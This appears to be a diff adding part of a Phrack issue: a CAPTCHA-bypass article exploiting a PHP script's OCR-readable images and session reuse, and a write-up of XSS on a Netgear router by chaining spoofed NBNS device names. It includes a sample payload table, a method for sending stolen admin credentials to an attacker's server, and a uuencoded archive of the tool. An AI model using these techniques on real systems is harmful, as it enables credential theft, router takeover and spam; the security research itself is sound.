+      $textbox = imagettfbbox($font_size,
+                              0,
+                              $this->font,
+                              $code)
+      or die('Error in imagettfbbox function');
+      $x = ($width - $textbox[4])/2;
+      $y = ($height - $textbox[5])/2;
+      imagettftext($image,
+                   $font_size,
+                   0,
+                   $x,
+                   $y,
+                   $text_color,
+                   $this->font ,
+                   $code)
+      or die('Error in imagettftext function');
+      /* output captcha image to browser */
+      header('Content-Type: image/jpeg');
+      imagejpeg($image);
+      imagedestroy($image);
+      $_SESSION['security_code'] = $code;
+   }
+
+}
+
+$width = isset($_GET['width']) && $_GET['width']<600?$_GET['width']:'120';
+$height = isset($_GET['height'])&&$_GET['height']<200?$_GET['height']:'40';
+$characters = isset($_GET['characters'])
+&& $_GET['characters']>2?$_GET['characters']:'6';
+
+$captcha = new CaptchaSecurityImages($width,$height,$characters);
+
+?>
+8<----------------------------------------------------------------------->8
+
+The reason why this particular script was chosen was lost in the mist of
+time so let's focus instead on the code:
+
+----[ 1 - Oops
+
+OK so darkangel was right, the script is *really* poorly designed:
+    -> The set of possible characters is limited to 28 characters
+    -> The characters are inserted in the image using imagettfbbox()
+           with (amongst other things) a fixed $font_size, a predictable
+           position, etc.
+    -> The noise itself is generated using lines and circles of the
+       same color ($noise_color) which makes it trivial to remove.
+
+Ok so we knew that it was crappy but there is even more. darkjoker's
+approach can be seen as a dictionnary attack applied when the noise has
+been removed. There is much more simple: since the characters are not
+distorded, we can easily recover them using an OCR software. Luckily there
+exists a GNU one: gocr. We tested it against the imagettfbbox() function
+and without surprise ... it worked.
+
+Hey man, it wasn't worth to spend that much time :>
+
+----[ 2 - Oops (bis)
+
+We located two interested things in the script and if you're a proficient
+PHP reader then you've probably noticed them too... ;-)
+
+    a) The number of characters inserted in the image is user controlled.
+       If an attacker calls http://phrack.org/captcha.php?characters=x then
+       he can generate a captcha with X characters ( x >= 2 ). This
+       shouldn't be an issue itself since captcha.php is called by the
+       server. However it is because...
+
+    b) The script includes an interesting line:
+            $_SESSION['security_code'] = $code;
+       This clearly means that the PHP session will only keep track of
+       the *last* $code. While this is a normal behavior (some captcha
+       aren't readable at all so the user must be allowed to refresh),
+       this will be at our advantage.
+
+This gives us the opportunity to mount a new attack:
+    -> I'm a spam bot and I'm writing some shit comment about how big &
+       hard your penis will be when you will purchase my special pills. A
+       PHP session is created.
+    -> A captcha is loaded and because I'm a bot I can't fucking read it.
+       Too bad for me.
+    -> Within the same session I call captcha.php with ?characters=2.
+       With a probability of 1/(28*28) I will be able to predict the
+       code generated. I'll try as many times as required until I'm right.
+    -> I will most likely succeed in the end and some poor desperate guy
+       may purchase the pills.
+
+We've changed the captcha mechanism, the old one being captcha_old.php
+
+----[ 3 - Conclusion
+
+Who knows if spammers are reading phrack? One thing is sure: the script is
+very present on Internet... Yes you should patch xD
+
+
+|=[ 0x04 ]=---=[ XSS Using NBNS on a Home Router - Simon Weber ]=--------=|
+
+
+--[ code is appended, but may not be the most recent. check:
+    https://github.com/simon-weber/XSS-over-NBNS
+    for the most recent version. ]--
+
+--[ Contents
+
+    1 - Abstract
+
+    2 - Test Device Background
+
+    3 - Injection Chaining Technique
+
+    4 - Device Specific Exploits
+     4.1 - Steal Router Admin Credentials
+     4.2 - Hide a Device on the Network
+
+    5 - Tool
+
+    6 - Fix, Detection and Prevention
+
+    7 - Applications
+
+    8 - References
+
+
+--[ 1 - Abstract
+
+For routers which:
+
+        1) use NBNS to identify attached devices
+        2) list these devices on their web admin interface
+        3) do not sanitize the names they receive
+
+there exists a 15 character injection vector on the web interface. This
+vector can be exploited by anyone on the network, and will affect anyone
+who visits a specific page on the web administration interface. Using
+multiple injections in sequence separated with block comments, it is
+possible to chain these injections to create a payload of arbitrary length.
+This can be used to gain router admin credentials, steal cookies from an
+admin, alter the view of attached devices, or perform any other XSS attack.
+
+The real world application of the technique is limited by how often admins
+are on the web interface. However, coupled with some social engineering,
+small businesses such as coffee shops may be vulnerable.
+
+--[ 2 - Test Device Background
+
+I got a Netgear wgr614 v5 for less than $15 shipped on eBay. This is a
+common home wireless B/G router. Originally released in 2004, its EOL was
+about 5 years ago [1].
+
+The web admin interface is pretty poorly built (sorry, Netgear!). If you
+poke around, you'll find a lot of unescaped input fields to play with.
+However, none of them can really be used to do anything interesting -
+they're one time injection vectors that other users won't see.
+
+However, there is one interesting page. This is the "attached devices" page
+(DEV_devices.htm). It shows a table of what's connected to the router, and
+looks something like this:
+
+        #  Name        IP              MAC
+        1  computer_1  192.168.1.2     07:E0:17:8F:11:2F
+        2  computer_2  192.168.1.11    AF:3C:07:4D:B0:3A
+        3     --       192.168.1.15    EB:3C:76:0F:67:43
+
+This table is generated from the routing table, and the name is filled in
+from NBNS responses to router requests. If a machine doesn't respond to
+NBNS, takes too long to respond, or it gives an invalid name (over 15
+characters or improperly terminated), the name is set to "--". The table is
+refreshed in two ways: automatically by the router at an interval, and by a
+user visiting or refreshing the page.
+
+A quick test showed that the name in this table was unescaped. However,
+this only gets us 15 characters of payload. I couldn't manage to squeeze a
+reference to external code in just 15 characters (maybe someone else can?).
+Executing arbitrary code will require something a bit more sophisticated.
+
+--[ 3 - Injection Chaining Technique
+
+The obvious way to get more characters for the payload is by chaining
+together multiple injections. To do this, we need a few things:
+
+    1) A way to make multiple entries in the table:
+        This is easy, we just send out fake responses for IP/MAC
+        combinations that don't already exist on the network.
+
+    2) A way to control the order of our entries:
+        Also easy: the table orders by IP address. We'll just use a
+        range of incremental addresses that no one else is using.
+
+    3) A way to chain our entries around the other html:
+        Block comments will work for this. Our injections will just open
+        and close block comments at the end and beginning of their
+        reported names. For an illustration, imagine anything between <>
+        will be ignored on the page, and our name injections are
+        delimited with single quotes:
+
+                      '[name 1] <' [ignored stuff]
+    [ignored stuff] '> [name 2] <' [ignored stuff]
+           ...      '> [name 3] <'      ...
+
+Great, that was easy. What kind of block comments can we use? How about
+html's?. This could work, but it has limitations. First off, -- or >
+anywhere in the commented out html will break things. Even if this did
+work, we'd have to be careful about where we split things, and the comments
+would take up about half of a 15 char name.
+
+Javascript's c-style block comments are smaller and more flexible. They can
+come anywhere in code, so long as it isn't the middle of a token. For
+example,
+
+            document/* ignored */.write("something")
+
+    is fine, while
+
+            docu/* uh oh */ment.write("something")
+
+    breaks things.
+
+We also just need to avoid */ in the commented out html, which should be
+much less likely to pop up than >. To use javascript block comments, we'll
+obviously need to use javascript to get our payload onto the page. Call it
+our "payload transporter". This will work just fine:
+
+            "<script>document.write('[payload]');</script>"
+
+So, then, the first thing to do is fit our transporter into 15 char chunks
+to send as our first few fake NBNS names. Being careful not to split tokens
+with comments, our first 3 names can be:
+
+            <script>/*
+            */document./*
+            */write(/*
+
+This will open the write command to inject our payload. Now we need to
+package the payload into the transporter in some more 15 char chunks. Since
+strings are tokens, we can't split one big string with block comments. We
+need to split up the payload into multiple strings and introduce more
+tokens between them. To do this, I leveraged the fact that document.write
+can take multiple arguments, which it will write in order - the commas that
+split parameters will be our extra tokens. String concatenation would work,
+too. So, our payload will be packaged into the transporter like:
+
+            'first part of payload', /*
+            */ 'second part of payload', /*
+            */ 'third part...', /*
+                    ...
+            */ ,'last part'); /*
+
+It's easy to control the length of the strings to fit into the 15 char
+length (we've just got to be careful about quotes in our payload). Lastly,
+we just need to close the script tag, and we're done. We now have a way to
+write an arbitrary length payload onto the attached devices page. Putting
+it all together, here's an example of what our series of fake NBNS
+responses could be if we wanted to get '<script>alert("test");</script>'
+onto the page:
+
+            Spoofed NBNS Name   IP               MAC
+            <script>/*          192.168.1.111    00:00:00:00:00:01
+            */document./*       192.168.1.112    00:00:00:00:00:02
+            */write(/*          192.168.1.113    00:00:00:00:00:03
+            */'<script>',/*     192.168.1.114    00:00:00:00:00:04
+            */'alert(\'',/*     192.168.1.115    00:00:00:00:00:05
+            */'test\');',/*     192.168.1.116    00:00:00:00:00:06
+            */'</script',/*     192.168.1.117    00:00:00:00:00:07
+            */'>');/*           192.168.1.118    00:00:00:00:00:08
+            */</script>         192.168.1.119    00:00:00:00:00:09
+
+There are a few other practical considerations that I found while working
+with my specific Netgear router. It will use the most recent information it
+has for device names. This means that we have to send our payload every
+time that requests are sent out. It also means that for some time after we
+stop injecting, the device listing is going to have a number of '--'
+entries; the router is expecting to get names for these devices but sees no
+response. To hide our tracks, we could reboot the router when finished
+(this is possible by either injection or after stealing admin credentials,
+which is detailed below).
+
+We also have to be careful that a legitimate device doesn't come on to the
+network with one of our spoofed IPs or MACs. This could possibly break our
+injection, depending on the timing of responses.
+
+One last thing to keep in mind: the NBNS packets need to get on the wire
+quickly, since the router only listens for NBNS responses for a short time.
+Thus, smaller payloads (which fit into less packets) are more likely to
+succeed. You'll want to create external javascript to do any heavy lifting,
+and just inject code to run it. When a payload fails, earlier packets will
+get there and others won't, leaving garbage in the attached devices list.
+
+--[ 4 - Device Specific Exploits
+
+Naturally, anything that can be done with XSS or javascript is fair game.
+You can attack the user (cookie stealing), the router (injected requests to
+the web interface are now authed), or the page itself. I created a few
+interesting examples that are specific to the Netgear device I had.
+
+------[ 4.1 - Steal Router Admin Credentials
+
+On the admin interface, there is an option to backup and restore the router
+settings. It generates a simple flat file database called netgear.cfg. This
+file itself is actually rather interesting. It seems to be a plaintext
+memory dump, guarded from manipulation by a checksum that I couldn't figure
+out (no one has cracked it as of the time this was written - if you do, let
+me know). In it, you'll find everything from wireless keys to static routes
+to - surprise - plaintext administrator information. This includes
+usernames and passwords for both the http admin and telnet super admin (see
+[3] for information on the hidden telnet console).
+
+It's easy to steal this file via XSS in the same way that cookies are
+stolen. The attacker first sets up a listening http server to receive the
+information. Then, the injection code simply GETs the file and sends it off
+to the listening server.
+
+With admin access to the router, the attacker can do all sorts of things.
+Basic traffic logging is built-in, and can even be emailed out
+automatically. DoS is possible through the router's website blocking
+functions. Man in the middle attacks are possible through the exposed dhcp
+dns, static routing and internet connection configuration options.
+
+------[ 4.2 - Hide a Device on the Network
+
+The only place that an admin can get information about who is on the
+network is right on the page we inject to. Manipulating the way the device
+list is displayed could provide simple counter-detection against a
+suspicious administrator.
+
+For this exploit, we inject javascript to iterate through the table and
+remove any row that matches a device we're interested in. Then, the table
+is renumbered. Note that we don't have to own the device to remove it from
+the list.
+
+Going one step further, the attacker can bolster the cloak of invisibility.
+Blocking connections not originating from the router is an obvious choice.
+It might be wise to block pings directly from the router as well.
+
+--[ 5 - Tool
+
+I used Scapy with Python to implement the technique and exploits described
+above and hosted it on Github [2]. You can also specify a custom exploit
+that will be packaged and sent using my chaining technique. I also made a
+simple python http server to listen for stolen admin credentials and serve
+up external exploit code. Credit goes to Robert Wesley McGrew for NBNSpoof;
+I reused some of his code [4].
+
+To combat the problem I described earlier about sending packets quickly, I
+listen for the first request from the router and precompute the response
+packets to send. These will be sent as responses to any other requests
+sniffed. You'll notice this if you use my tool; a "ready to inject" message
+will be printed after the responses are generated.
+
+If you look at my built-in exploits, you'll see they each use a loadhelp2
+function as the entry point. This is just an easy way to get them to run
+when the page is loaded. The router declares the loadhelp function
+externally, and runs it on page load; I declare it on the page (so my
+version is actually used), and use it to launch my external loadhelp2 code.
+Then, the original code is patched on to the end, so the user doesn't
+notice.
+
+--[ 6 - Fix, Detection and Prevention
+
+To close the hole, Netgear would only need to change some web backend code
+in the firmware to escape NBNS names. I contacted Netgear about this. They
+won't make a fix for this specific model - it already saw its support EOL -
+but they are checking their newer models for this flaw as of September 2011
+[1].
+
+So, if you have this router, know that a fix isn't coming. While it may be
+difficult to initially detect that a device you own is being attacked, once
+you suspect it there are simple ways to verify it:
+
+        check the source of the affected page; you'll see the commented
+        out device entries with suspicious names
+
+        use the hidden telnet interface. This will show the many fake
+        IPs that are generated when packing a payload.
+
+        as a last resort, watch network traffic for malformed NBNS names
+
+Also, keep in mind that you can only be affected when checking your
+router's configuration. You could protect yourself completely by never
+visiting the web administration interface.
+
+--[ 7 - Applications
+
+Of course, this technique's practical application is limited to how often
+users check their router admin pages. However, when coupled with some
+social engineering, I could imagine a vulnerability for small businesses
+like coffee shops.
+
+These locations commonly offer wireless using off-the-shelf hardware like
+my Netgear router. Getting on their network is easy - it's already open. At
+this point, the attacker starts the exploit, then convinces an employee to
+check the admin pages (maybe "I'm having some strange issues with the
+wireless...Can you check on the router and see if my device is showing
+up?"). I'm sure a practiced social engineer would have no trouble pulling
+this off.
+
+As far as applying this beyond the home networking realm, a good place to
+start would be investigating this technique on other routers or better
+firmwares like DD-WRT or Tomato. That would at least determine if this is a
+common flaw. I didn't have another device to play with (the wgr614v5
+doesn't work with other firmware), so I'll leave it for someone else to
+try.
+
+I'm doubtful that other applications very different from what I described
+exist. Router administration pages simply aren't viewed very much. However,
+the broader idea of XSS through spoofed NBNS names might be applicable to a
+different domain. Anywhere there is a listing of NBNS names, there is the
+possibility of an injection vector.
+
+--[ 8 - References
+
+[1]  private communication with Netgear, September 2011
+[2]  https://github.com/simon-weber/XSS-over-NBNS
+[3]  http://www.seattlewireless.net/NetgearWGR614#TelnetConsole
+[4]  http://www.mcgrewsecurity.com/tools/nbnspoof/
+
+
+                                           October 2011
+                                           Simon Weber
+                                           sweb090 _at_ gmail.com
+
+
+begin 644 xss_over_nbns.tgz
+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
